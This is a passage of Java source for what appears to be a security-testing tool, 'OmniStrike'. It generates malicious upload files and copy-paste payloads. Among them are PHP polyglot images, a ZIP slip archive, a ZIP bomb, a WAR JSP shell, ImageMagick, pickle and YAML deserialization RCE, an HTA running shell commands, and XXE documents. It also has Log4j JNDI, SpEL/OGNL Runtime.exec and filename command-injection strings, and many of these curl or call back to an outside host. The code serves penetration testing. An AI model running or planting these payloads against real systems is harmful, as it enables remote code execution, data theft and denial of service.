        wc.append("resourceType=\"Unspecified\" requireAccess=\"None\" />\n");
        wc.append("    </handlers>\n");
        wc.append("  </system.webServer>\n");
        wc.append("</configuration>\n");
        return wc.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== CSV Injection ====================

    public static byte[] csvInjection(String canary, String oobUrl) {
        StringBuilder csv = new StringBuilder();
        csv.append("Name,Email,Notes\n");
        csv.append("Test,test@test.com,").append(canary).append("\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            csv.append("=cmd|'/C curl ").append(oobUrl).append("'!A1,evil@test.com,formula injection\n");
        } else {
            csv.append("=cmd|'/C calc.exe'!A1,evil@test.com,formula injection\n");
        }
        csv.append("+cmd|'/C id'!A1,evil2@test.com,plus prefix\n");
        csv.append("-cmd|'/C id'!A1,evil3@test.com,minus prefix\n");
        csv.append("@SUM(1+1)*cmd|'/C id'!A1,evil4@test.com,at prefix\n");
        return csv.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== LaTeX Injection ====================

    public static byte[] latexPoc(String canary, String oobUrl) {
        StringBuilder tex = new StringBuilder();
        tex.append("% ").append(canary).append("\n");
        tex.append("\\documentclass{article}\n");
        tex.append("\\begin{document}\n");
        tex.append("\\immediate\\write18{id > /tmp/").append(canary).append(".txt}\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            tex.append("\\immediate\\write18{curl ").append(oobUrl).append("}\n");
        }
        tex.append("\\input{/etc/passwd}\n");
        tex.append("\\end{document}\n");
        return tex.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Markdown (with HTML injection) ====================

    public static byte[] markdownXss(String canary, String oobUrl) {
        StringBuilder md = new StringBuilder();
        md.append("# ").append(canary).append("\n\n");
        md.append("[Click me](javascript:fetch('").append(oobUrl != null ? oobUrl : "http://COLLABORATOR").append("'))\n\n");
        md.append("![img](x \"onerror=fetch('").append(oobUrl != null ? oobUrl : "http://COLLABORATOR").append("')\")\n\n");
        md.append("<details open ontoggle=fetch('").append(oobUrl != null ? oobUrl : "http://COLLABORATOR").append("')>\n");
        md.append("<summary>").append(canary).append("</summary>\n</details>\n");
        return md.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== GIF + PHP Polyglot ====================

    public static byte[] gifPhpPolyglot(String canary, String oobUrl) {
        StringBuilder payload = new StringBuilder();
        payload.append("GIF89a"); // GIF magic bytes — passes getimagesize() and file/mime checks
        payload.append("<?php\n");
        payload.append("// OmniStrike POC — GIF+PHP polyglot\n");
        payload.append("echo '").append(canary).append("';\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            payload.append("@file_get_contents('").append(oobUrl).append("');\n");
        }
        payload.append("echo phpversion();\n");
        payload.append("?>\n");
        return payload.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    // ==================== JPEG + PHP Polyglot ====================

    public static byte[] jpegPhpPolyglot(String canary, String oobUrl) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            // JPEG SOI + APP0 JFIF header (passes getimagesize)
            baos.write(new byte[]{(byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0});
            byte[] jfif = {0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
                    0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00};
            baos.write(jfif);
            // COM marker with PHP payload
            StringBuilder php = new StringBuilder();
            php.append("<?php echo '").append(canary).append("';");
            if (oobUrl != null && !oobUrl.isEmpty()) {
                php.append("@file_get_contents('").append(oobUrl).append("');");
            }
            php.append("echo phpversion();?>");
            byte[] phpBytes = php.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
            baos.write(new byte[]{(byte) 0xFF, (byte) 0xFE}); // COM marker
            int commentLen = phpBytes.length + 2;
            baos.write((byte) (commentLen >> 8));
            baos.write((byte) (commentLen & 0xFF));
            baos.write(phpBytes);
            // Minimal image data + EOI
            baos.write(new byte[]{
                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00,
                    0x01, 0x01, 0x01, 0x11, 0x00,
                    (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01, 0x05,
                    0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02,
                    0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
                    (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
                    0x3F, 0x00, 0x7B, 0x40,
                    (byte) 0xFF, (byte) 0xD9
            });
        } catch (Exception e) {
            return new byte[0];
        }
        return baos.toByteArray();
    }

    // ==================== ZIP Slip (Path Traversal via Archive) ====================

    public static byte[] zipSlip(String canary, String oobUrl) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(baos);
            // Entry with path traversal — extracts outside the intended directory
            String phpPayload = "<?php echo '" + canary + "';"
                    + (oobUrl != null && !oobUrl.isEmpty() ? "@file_get_contents('" + oobUrl + "');" : "")
                    + "echo phpversion();?>";
            // Multiple traversal depths for different extraction contexts
            String[] paths = {
                    "../../../tmp/" + canary + ".txt",
                    "../../../../tmp/" + canary + ".php",
                    "../../../var/www/html/" + canary + ".php",
            };
            for (String path : paths) {
                zos.putNextEntry(new ZipEntry(path));
                zos.write(phpPayload.getBytes(java.nio.charset.StandardCharsets.UTF_8));
                zos.closeEntry();
            }
            // Also include a benign file so the ZIP looks normal
            zos.putNextEntry(new ZipEntry("readme.txt"));
            zos.write(("OmniStrike POC — " + canary).getBytes(java.nio.charset.StandardCharsets.UTF_8));
            zos.closeEntry();
            zos.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    // ==================== ZIP Bomb (DoS via Decompression) ====================

    public static byte[] zipBomb(String canary) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(baos);
            // Create a file filled with zeros — compresses extremely well
            // 10MB of zeros compresses to ~10KB
            byte[] zeros = new byte[1024 * 1024]; // 1MB of zeros
            for (int i = 0; i < 10; i++) {
                zos.putNextEntry(new ZipEntry(canary + "_" + i + ".txt"));
                zos.write(zeros);
                zos.closeEntry();
            }
            zos.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    // ==================== WAR Deploy (Tomcat/JBoss) ====================

    public static byte[] warDeploy(String canary, String oobUrl) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(baos);
            // WEB-INF/web.xml (minimal)
            String webXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" version=\"3.1\">\n"
                    + "  <display-name>" + canary + "</display-name>\n"
                    + "</web-app>\n";
            zos.putNextEntry(new ZipEntry("WEB-INF/web.xml"));
            zos.write(webXml.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            zos.closeEntry();
            // index.jsp — POC shell
            StringBuilder jsp = new StringBuilder();
            jsp.append("<%@ page import=\"java.net.*,java.io.*\" %>\n");
            jsp.append("<%\n");
            jsp.append("out.println(\"").append(canary).append("\");\n");
            if (oobUrl != null && !oobUrl.isEmpty()) {
                jsp.append("try { new URL(\"").append(oobUrl).append("\").openStream().close(); } catch(Exception e) {}\n");
            }
            jsp.append("out.println(System.getProperty(\"java.version\"));\n");
            jsp.append("out.println(System.getProperty(\"os.name\"));\n");
            jsp.append("%>\n");
            zos.putNextEntry(new ZipEntry("index.jsp"));
            zos.write(jsp.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8));
            zos.closeEntry();
            zos.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    // ==================== ImageMagick MVG Exploit ====================

    public static byte[] imageMagickMvg(String canary, String oobUrl) {
        String url = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "https://COLLABORATOR";
        StringBuilder mvg = new StringBuilder();
        mvg.append("push graphic-context\n");
        mvg.append("viewbox 0 0 640 480\n");
        mvg.append("fill 'url(").append(url).append("/").append(canary).append(")'\n");
        mvg.append("pop graphic-context\n");
        return mvg.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    // ==================== ImageMagick SVG Delegate RCE ====================

    public static byte[] imageMagickSvg(String canary, String oobUrl) {
        String cmd = (oobUrl != null && !oobUrl.isEmpty())
                ? "curl " + oobUrl + "/" + canary
                : "id > /tmp/" + canary + ".txt";
        StringBuilder svg = new StringBuilder();
        svg.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        svg.append("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n");
        svg.append("  <image xlink:href=\"ephemeral:/").append(cmd).append("\" />\n");
        svg.append("  <!-- ").append(canary).append(" -->\n");
        svg.append("  <image xlink:href=\"https://example.com/image.png|").append(cmd).append("\" />\n");
        svg.append("</svg>\n");
        return svg.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    // ==================== Python Pickle RCE ====================

    public static byte[] pythonPickle(String canary, String oobUrl) {
        // Generate a Python script that creates the pickle file
        // The actual pickle payload uses __reduce__ to call os.system()
        String cmd = (oobUrl != null && !oobUrl.isEmpty())
                ? "curl " + oobUrl + "/" + canary
                : "echo " + canary;
        // Pickle opcodes for: os.system("<cmd>")
        // cos\nsystem\n(S'<cmd>'\ntR.
        StringBuilder pickle = new StringBuilder();
        pickle.append("cos\nsystem\n(S'").append(cmd).append("'\ntR.");
        return pickle.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    // ==================== HTA (HTML Application) ====================

    public static byte[] htaFile(String canary, String oobUrl) {
        StringBuilder hta = new StringBuilder();
        hta.append("<html>\n<head>\n<title>").append(canary).append("</title>\n");
        hta.append("<HTA:APPLICATION ID=\"omnistrike\" APPLICATIONNAME=\"").append(canary).append("\" ");
        hta.append("SINGLEINSTANCE=\"yes\" WINDOWSTATE=\"minimize\">\n");
        hta.append("</head>\n<body>\n<script language=\"VBScript\">\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            hta.append("Set objHTTP = CreateObject(\"MSXML2.ServerXMLHTTP\")\n");
            hta.append("objHTTP.open \"GET\", \"").append(oobUrl).append("/").append(canary).append("\", False\n");
            hta.append("objHTTP.send\n");
        }
        hta.append("Set objShell = CreateObject(\"WScript.Shell\")\n");
        hta.append("objShell.Run \"cmd /c echo ").append(canary).append(" > %TEMP%\\").append(canary).append(".txt\", 0\n");
        hta.append("</script>\n</body>\n</html>\n");
        return hta.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    // ==================== ASP Classic Shell (POC) ====================

    public static byte[] aspClassicPoc(String canary, String oobUrl) {
        StringBuilder asp = new StringBuilder();
        asp.append("<%\n");
        asp.append("' OmniStrike POC — confirms ASP Classic execution\n");
        asp.append("Response.Write \"").append(canary).append("\"\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            asp.append("Set http = CreateObject(\"MSXML2.ServerXMLHTTP\")\n");
            asp.append("http.open \"GET\", \"").append(oobUrl).append("/").append(canary).append("\", False\n");
            asp.append("http.send\n");
            asp.append("Set http = Nothing\n");
        }
        asp.append("Response.Write Server.MapPath(\".\")\n");
        asp.append("%>\n");
        return asp.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    // ==================== SVG with foreignObject ====================

    public static byte[] svgForeignObject(String canary, String oobUrl) {
        StringBuilder svg = new StringBuilder();
        svg.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        svg.append("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n");
        svg.append("  <foreignObject width=\"100%\" height=\"100%\">\n");
        svg.append("    <body xmlns=\"http://www.w3.org/1999/xhtml\">\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            svg.append("      <iframe src=\"").append(oobUrl).append("/").append(canary).append("\"></iframe>\n");
            svg.append("      <img src=\"").append(oobUrl).append("/").append(canary).append("\">\n");
        }
        svg.append("      <script>document.title='").append(canary).append("'</script>\n");
        svg.append("    </body>\n");
        svg.append("  </foreignObject>\n");
        svg.append("</svg>\n");
        return svg.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    // ==================== PPTX with XXE ====================

    public static byte[] pptxWithXxe(String canary, String oobUrl) {
        String entityUrl = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "file:///etc/passwd";
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(baos);
            // [Content_Types].xml with XXE
            String contentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE Types [\n"
                    + "  <!ENTITY xxe SYSTEM \"" + entityUrl + "\">\n"
                    + "]>\n"
                    + "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n"
                    + "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n"
                    + "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n"
                    + "  <!-- " + canary + " &xxe; -->\n"
                    + "</Types>\n";
            zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zos.write(contentTypes.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            zos.closeEntry();
            // _rels/.rels
            String rels = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n"
                    + "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"ppt/presentation.xml\"/>\n"
                    + "</Relationships>\n";
            zos.putNextEntry(new ZipEntry("_rels/.rels"));
            zos.write(rels.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            zos.closeEntry();
            // ppt/presentation.xml
            String pres = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<p:presentation xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\">\n"
                    + "  <p:sldMasterIdLst/>\n"
                    + "  <p:sldIdLst/>\n"
                    + "  <!-- " + canary + " -->\n"
                    + "</p:presentation>\n";
            zos.putNextEntry(new ZipEntry("ppt/presentation.xml"));
            zos.write(pres.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            zos.closeEntry();
            zos.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    // ==================== YAML Deserialization ====================

    public static byte[] yamlDeserialize(String canary, String oobUrl) {
        String cmd = (oobUrl != null && !oobUrl.isEmpty())
                ? "curl " + oobUrl + "/" + canary
                : "echo " + canary;
        StringBuilder yaml = new StringBuilder();
        yaml.append("# OmniStrike POC — YAML deserialization\n");
        yaml.append("# Python (PyYAML unsafe_load)\n");
        yaml.append("!!python/object/apply:os.system ['").append(cmd).append("']\n");
        yaml.append("---\n");
        yaml.append("# Ruby (Psych/YAML.load)\n");
        yaml.append("--- !ruby/object:Gem::Installer\ni: x\n");
        yaml.append("---\n");
        yaml.append("# Java (SnakeYAML)\n");
        yaml.append("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"");
        yaml.append(oobUrl != null && !oobUrl.isEmpty() ? oobUrl : "http://COLLABORATOR");
        yaml.append("/").append(canary).append("\"]]]]\n");
        return yaml.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    // ==================== RTF with OLE Object ====================

    public static byte[] rtfOle(String canary, String oobUrl) {
        String url = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl + "/" + canary : "http://COLLABORATOR/" + canary;
        StringBuilder rtf = new StringBuilder();
        rtf.append("{\\rtf1\\ansi\\deff0\n");
        rtf.append("{\\info{\\title ").append(canary).append("}}\n");
        rtf.append("OmniStrike POC\\par\n");
        // OLE link — triggers HTTP request when opened in Word
        rtf.append("{\\object\\objautlink\\objupdate\n");
        rtf.append("{\\*\\objclass htmlfile}\n");
        rtf.append("{\\*\\objdata ");
        // Encode the URL as hex for RTF objdata (simplified — link reference)
        byte[] urlBytes = url.getBytes(java.nio.charset.StandardCharsets.US_ASCII);
        for (byte b : urlBytes) {
            rtf.append(String.format("%02x", b));
        }
        rtf.append("}\n");
        rtf.append("{\\result{\\pict}}}\n");
        // Also embed via field code — more reliable OOB trigger
        rtf.append("{\\field{\\*\\fldinst INCLUDEPICTURE \"").append(url).append("\" \\\\d}{\\fldrslt}}\n");
        rtf.append("}\n");
        return rtf.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    // ==================== Summary / List ====================

    /**
     * Returns descriptions of all available payload types.
     */
    public static String[][] getPayloadTypes() {
        return new String[][]{
                {"pdf_js", "PDF with JavaScript", ".pdf", "application/pdf"},
                {"svg_xss", "SVG with XSS (onload)", ".svg", "image/svg+xml"},
                {"svg_xxe", "SVG with XXE", ".svg", "image/svg+xml"},
                {"html_xss", "HTML with XSS", ".html", "text/html"},
                {"xml_xxe", "XML with XXE", ".xml", "application/xml"},
                {"docx_xxe", "DOCX with XXE", ".docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"},
                {"xlsx_xxe", "XLSX with XXE", ".xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"},
                {"php_poc", "PHP POC (echo canary + OOB)", ".php", "application/x-httpd-php"},
                {"jsp_poc", "JSP POC (echo canary + OOB)", ".jsp", "text/plain"},
                {"aspx_poc", "ASPX POC (echo canary + OOB)", ".aspx", "text/plain"},
                {"python_poc", "Python POC (print canary + OOB)", ".py", "text/plain"},
                {"polyglot_gif", "Polyglot GIF/JS", ".gif", "image/gif"},
                {"htaccess", ".htaccess (PHP via .jpg)", ".htaccess", "text/plain"},
                {"eicar", "EICAR AV Test File", ".com", "application/octet-stream"},
                {"jpeg_exif_xss", "JPEG with EXIF XSS", ".jpg", "image/jpeg"},
                {"png_text_xss", "PNG with tEXt XSS", ".png", "image/png"},
                {"ssi_poc", "SSI Server-Side Include", ".shtml", "text/html"},
                {"ruby_poc", "Ruby POC (puts canary + OOB)", ".rb", "text/plain"},
                {"perl_poc", "Perl POC (print canary + OOB)", ".pl", "text/plain"},
                {"nodejs_poc", "Node.js POC (console.log + OOB)", ".js", "application/javascript"},
                {"bash_poc", "Bash POC (echo canary + OOB)", ".sh", "text/x-shellscript"},
                {"powershell_poc", "PowerShell POC (Write-Output + OOB)", ".ps1", "text/plain"},
                {"cfml_poc", "ColdFusion CFML POC", ".cfm", "text/plain"},
                {"go_template", "Go Template injection", ".tmpl", "text/plain"},
                {"jinja2_template", "Jinja2 Template injection", ".j2", "text/plain"},
                {"freemarker_template", "Freemarker RCE Template", ".ftl", "text/plain"},
                {"handlebars_template", "Handlebars RCE Template", ".hbs", "text/plain"},
                {"ejs_template", "EJS Template injection", ".ejs", "text/plain"},
                {"smarty_template", "Smarty (PHP) Template injection", ".tpl", "text/plain"},
                {"pug_template", "Pug/Jade Template injection", ".pug", "text/plain"},
                {"mako_template", "Mako (Python) Template injection", ".mako", "text/plain"},
                {"thymeleaf_template", "Thymeleaf (Java) RCE Template", ".html", "text/html"},
                {"velocity_template", "Velocity (Java) RCE Template", ".vm", "text/plain"},
                {"xslt_injection", "XSLT Injection", ".xslt", "application/xslt+xml"},
                {"user_ini", ".user.ini (PHP auto_prepend)", ".user.ini", "text/plain"},
                {"web_config", "web.config (IIS handler hijack)", "web.config", "application/xml"},
                {"csv_injection", "CSV with formula injection", ".csv", "text/csv"},
                {"latex_injection", "LaTeX with RCE (write18)", ".tex", "text/plain"},
                {"markdown_xss", "Markdown with HTML/XSS injection", ".md", "text/markdown"},
                {"gif_php_polyglot", "GIF+PHP Polyglot (bypasses getimagesize)", ".gif.php", "image/gif"},
                {"jpeg_php_polyglot", "JPEG+PHP Polyglot (bypasses getimagesize)", ".jpg.php", "image/jpeg"},
                {"zip_slip", "ZIP Slip (path traversal via archive)", ".zip", "application/zip"},
                {"zip_bomb", "ZIP Bomb (decompression DoS)", ".zip", "application/zip"},
                {"war_deploy", "WAR Deploy (Tomcat/JBoss JSP shell)", ".war", "application/java-archive"},
                {"imagemagick_mvg", "ImageMagick MVG Exploit", ".mvg", "image/x-mvg"},
                {"imagemagick_svg", "ImageMagick SVG Delegate RCE", ".svg", "image/svg+xml"},
                {"python_pickle", "Python Pickle RCE (deserialization)", ".pkl", "application/octet-stream"},
                {"hta_file", "HTA Windows Application", ".hta", "application/hta"},
                {"asp_classic", "ASP Classic POC (echo canary + OOB)", ".asp", "text/plain"},
                {"svg_foreign_object", "SVG with foreignObject XSS", ".svg", "image/svg+xml"},
                {"pptx_xxe", "PPTX with XXE", ".pptx", "application/vnd.openxmlformats-officedocument.presentationml.presentation"},
                {"yaml_deserialize", "YAML Deserialization (Python/Ruby/Java)", ".yml", "text/yaml"},
                {"rtf_ole", "RTF with OLE Object (OOB trigger)", ".rtf", "application/rtf"},
        };
    }

    /**
     * Generates a payload by type ID.
     * @param typeId One of the IDs from getPayloadTypes() (e.g., "pdf_js", "php_poc")
     * @param canary Unique tracking string
     * @param oobUrl Optional Collaborator/OOB URL (null for no callback)
     * @return Raw file bytes, or empty array if type unknown
     */
    public static byte[] generate(String typeId, String canary, String oobUrl) {
        switch (typeId) {
            case "pdf_js": return pdfWithJavaScript(canary, oobUrl);
            case "svg_xss": return svgWithXss(canary, oobUrl);
            case "svg_xxe": return svgWithXxe(canary, oobUrl);
            case "html_xss": return htmlWithXss(canary, oobUrl);
            case "xml_xxe": return xmlWithXxe(canary, oobUrl);
            case "docx_xxe": return docxWithXxe(canary, oobUrl);
            case "xlsx_xxe": return xlsxWithXxe(canary, oobUrl);
            case "php_poc": return phpPoc(canary, oobUrl);
            case "jsp_poc": return jspPoc(canary, oobUrl);
            case "aspx_poc": return aspxPoc(canary, oobUrl);
            case "python_poc": return pythonPoc(canary, oobUrl);
            case "polyglot_gif": return polyglotGifJs(canary, oobUrl);
            case "htaccess": return htaccessPhpBypass(canary);
            case "eicar": return eicarTest();
            case "jpeg_exif_xss": return jpegWithExifXss(canary, oobUrl);
            case "png_text_xss": return pngWithTextXss(canary, oobUrl);
            case "ssi_poc": return ssiPoc(canary, oobUrl);
            case "ruby_poc": return rubyPoc(canary, oobUrl);
            case "perl_poc": return perlPoc(canary, oobUrl);
            case "nodejs_poc": return nodejsPoc(canary, oobUrl);
            case "bash_poc": return bashPoc(canary, oobUrl);
            case "powershell_poc": return powershellPoc(canary, oobUrl);
            case "cfml_poc": return cfmlPoc(canary, oobUrl);
            case "go_template": return goTemplatePoc(canary, oobUrl);
            case "jinja2_template": return jinja2Poc(canary, oobUrl);
            case "freemarker_template": return freemarkerPoc(canary, oobUrl);
            case "handlebars_template": return handlebarsPoc(canary, oobUrl);
            case "ejs_template": return ejsPoc(canary, oobUrl);
            case "smarty_template": return smartyPoc(canary, oobUrl);
            case "pug_template": return pugPoc(canary, oobUrl);
            case "mako_template": return makoPoc(canary, oobUrl);
            case "thymeleaf_template": return thymeleafPoc(canary, oobUrl);
            case "velocity_template": return velocityPoc(canary, oobUrl);
            case "xslt_injection": return xsltPoc(canary, oobUrl);
            case "user_ini": return userIniPoc(canary);
            case "web_config": return webConfigPoc(canary, oobUrl);
            case "csv_injection": return csvInjection(canary, oobUrl);
            case "latex_injection": return latexPoc(canary, oobUrl);
            case "markdown_xss": return markdownXss(canary, oobUrl);
            case "gif_php_polyglot": return gifPhpPolyglot(canary, oobUrl);
            case "jpeg_php_polyglot": return jpegPhpPolyglot(canary, oobUrl);
            case "zip_slip": return zipSlip(canary, oobUrl);
            case "zip_bomb": return zipBomb(canary);
            case "war_deploy": return warDeploy(canary, oobUrl);
            case "imagemagick_mvg": return imageMagickMvg(canary, oobUrl);
            case "imagemagick_svg": return imageMagickSvg(canary, oobUrl);
            case "python_pickle": return pythonPickle(canary, oobUrl);
            case "hta_file": return htaFile(canary, oobUrl);
            case "asp_classic": return aspClassicPoc(canary, oobUrl);
            case "svg_foreign_object": return svgForeignObject(canary, oobUrl);
            case "pptx_xxe": return pptxWithXxe(canary, oobUrl);
            case "yaml_deserialize": return yamlDeserialize(canary, oobUrl);
            case "rtf_ole": return rtfOle(canary, oobUrl);
            default: return new byte[0];
        }
    }

    // ==================== INLINE PAYLOADS (copy-paste into request body) ====================

    /**
     * Returns inline payload strings that the user can copy-paste directly into
     * a request parameter or body. These are NOT files — they're text strings
     * designed to be pasted into form fields, JSON values, or multipart data.
     *
     * @param canary Unique tracking string
     * @param oobUrl Optional Collaborator/OOB URL
     * @return Array of {payloadId, description, payload, notes}
     */
    public static String[][] getInlinePayloads(String canary, String oobUrl) {
        String oob = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "http://COLLABORATOR_URL";
        return new String[][]{
                // SVG injection (paste into filename or text field)
                {"svg_inline", "SVG XSS (inline)",
                        "<svg onload=fetch('" + oob + "')>" + canary + "</svg>",
                        "Paste into any text field. If rendered as SVG, fires callback."},

                // Image tag with OOB (paste into rich text / comment fields)
                {"img_oob", "Image OOB callback",
                        "<img src=\"" + oob + "/" + canary + "\">",
                        "Paste into HTML-rendered fields. Server fetches the image URL."},

                // PHP short tag (paste into filename or upload body)
                {"php_short", "PHP short tag",
                        "<?='" + canary + "'.phpversion()?>",
                        "Minimal PHP execution test. Paste as filename or in uploaded file content."},

                // SSTI probes (paste into any text field)
                {"ssti_jinja2", "Jinja2/Twig SSTI",
                        "{{'" + canary + "'~__class__.__mro__[1].__subclasses__()}}",
                        "Jinja2/Twig template injection. Look for canary + class list in response."},

                // XXE inline (paste into XML body)
                {"xxe_inline", "XXE entity (inline)",
                        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"" + oob + "/" + canary + "\">]><r>&xxe;</r>",
                        "Complete XXE payload. Paste as the entire request body (set Content-Type: application/xml)."},

                // XXE OOB parameter entity
                {"xxe_oob", "XXE OOB (parameter entity)",
                        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM \"" + oob + "/" + canary + "\">%xxe;]><r>test</r>",
                        "Blind XXE via parameter entity. Requires external DTD hosting for data exfil."},

                // Log4j / JNDI (paste into any header or field)
                {"log4j", "Log4j JNDI lookup",
                        "${jndi:ldap://" + oob + "/" + canary + "}",
                        "Paste into User-Agent, Referer, X-Forwarded-For, or any logged field."},

                // EL injection (Spring/Java)
                {"el_injection", "Expression Language injection",
                        "${'" + canary + "'.concat(T(java.lang.Runtime).getRuntime().exec('nslookup " + oob + "'))}",
                        "Java EL injection. Triggers DNS callback if EL is evaluated."},

                // CRLF injection with XSS via header
                {"crlf_xss", "CRLF + header injection",
                        canary + "%0d%0aX-Injected: " + canary + "%0d%0a%0d%0a<img src=" + oob + "/" + canary + ">",
                        "Paste into redirect URL or header-reflected parameter."},

                // Filename-based payloads (use as uploaded filename)
                {"filename_path_traversal", "Filename: path traversal",
                        "../../../tmp/" + canary + ".txt",
                        "Use as the uploaded filename to test path traversal in file storage."},

                {"filename_cmd_injection", "Filename: command injection",
                        canary + ";curl " + oob + "/" + canary + ";.jpg",
                        "Use as filename. If the server passes filename to shell commands, triggers callback."},

                {"filename_ssti", "Filename: SSTI",
                        "{{" + canary + ".__class__}}.jpg",
                        "Use as filename. If filename is rendered in a template, class info leaks."},

                // Polyglot: valid in multiple contexts
                {"polyglot", "Universal polyglot",
                        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=fetch('" + oob + "/" + canary + "') )//",
                        "Works across HTML, JS, and URL contexts. Paste anywhere user input is reflected."},

                // Template injection probes
                {"ssti_freemarker", "Freemarker SSTI",
                        "${\"" + canary + "\"?upper_case}",
                        "Freemarker template injection. If output shows canary uppercased, confirmed."},

                {"ssti_velocity", "Velocity SSTI",
                        "#set($x='" + canary + "')$x",
                        "Velocity template injection. Look for canary echoed in response."},

                {"ssti_thymeleaf", "Thymeleaf SSTI (Spring)",
                        "__${T(java.lang.Runtime).getRuntime().exec('nslookup " + oob + "')}__::.x",
                        "Thymeleaf expression injection in Spring apps. Triggers DNS callback."},

                {"ssti_mako", "Mako SSTI",
                        "${'" + canary + "'.upper()}",
                        "Mako (Python) template injection. Look for uppercased canary in response."},

                {"ssti_smarty", "Smarty SSTI",
                        "{system('nslookup " + oob + "')}" + canary,
                        "Smarty (PHP) template injection with OOB callback."},

                {"ssti_handlebars", "Handlebars SSTI",
                        "{{#with \"s\" as |string|}}{{string.toString}}{{/with}}" + canary,
                        "Handlebars template injection probe. Look for [object Object] or error in response."},

                {"ssti_ejs", "EJS SSTI",
                        "<%= '" + canary + "'.toUpperCase() %>",
                        "EJS template injection. If output shows uppercased canary, confirmed."},

                {"ssti_pug", "Pug/Jade SSTI",
                        "#{'" + canary + "'.toUpperCase()}",
                        "Pug template injection. Look for uppercased canary in response."},

                // Server-side execution probes
                {"ruby_inline", "Ruby ERB inline",
                        "<%= '" + canary + "' %>",
                        "Ruby ERB template. Paste as filename or value. Look for canary rendered."},

                {"perl_inline", "Perl inline eval",
                        "print(\"" + canary + "\");",
                        "Perl eval() injection. Paste in parameters that may be eval'd."},

                {"el_spring", "Spring EL (SpEL)",
                        "#{T(java.lang.Runtime).getRuntime().exec('nslookup " + oob + "')}",
                        "Spring Expression Language. Paste in parameters processed by Spring."},

                {"ognl_struts", "OGNL (Struts2)",
                        "%{(#rt=@java.lang.Runtime@getRuntime().exec('nslookup " + oob + "'))}",
